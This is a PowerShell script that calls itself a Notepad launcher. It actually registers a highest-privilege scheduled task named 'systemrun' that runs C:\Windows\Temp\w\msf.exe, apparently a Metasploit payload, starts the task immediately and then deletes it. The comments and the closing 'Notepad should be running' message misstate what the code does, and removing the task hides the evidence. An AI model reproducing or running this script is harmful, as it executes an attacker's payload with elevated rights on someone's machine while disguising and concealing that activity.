# PowerShell script to create a Notepad task, run it, and then delete it

# Define task name
$taskName = "systemrun"

# Step 1: Create the scheduled task with highest privileges
Write-Host "Creating scheduled task '$taskName'..."
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\w\msf.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddYears(10)
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest -LogonType Interactive
$settings = New-ScheduledTaskSettingsSet

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Step 2: Run the task
Write-Host "Running task '$taskName'..."
Start-ScheduledTask -TaskName $taskName

# Step 3: Wait a moment to ensure the task has started
Start-Sleep -Seconds 2

# Step 4: Delete the task
Write-Host "Deleting task '$taskName'..."
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

Write-Host "Process completed! Notepad should be running and the task has been removed."
